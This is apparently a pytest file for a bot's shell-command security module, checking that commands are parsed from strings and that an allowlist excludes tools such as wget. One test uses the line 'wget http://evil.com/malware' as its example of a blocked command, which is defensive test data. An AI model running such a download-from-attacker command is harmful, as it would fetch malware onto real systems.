"""Tests for the security module."""

from bot.security import extract_commands, BASE_ALLOWED_COMMANDS


def test_extract_simple_command():
    assert extract_commands("ls -la") == ["ls"]


def test_extract_piped_commands():
    assert extract_commands("grep foo | sort | uniq") == ["grep", "sort", "uniq"]


def test_extract_chained_commands():
    assert extract_commands("npm install && npm test") == ["npm", "npm"]


def test_extract_semicolon_commands():
    assert extract_commands("echo hello; ls") == ["echo", "ls"]


def test_extract_with_path():
    assert extract_commands("/usr/bin/python script.py") == ["python"]


def test_extract_with_env_var():
    assert extract_commands("NODE_ENV=test npm start") == ["npm"]


def test_blocked_command():
    """Commands not in allowlist should be detectable."""
    cmds = extract_commands("wget http://evil.com/malware")
    assert cmds == ["wget"]
    assert "wget" not in BASE_ALLOWED_COMMANDS


def test_allowed_command():
    cmds = extract_commands("git status")
    assert cmds == ["git"]
    assert "git" in BASE_ALLOWED_COMMANDS
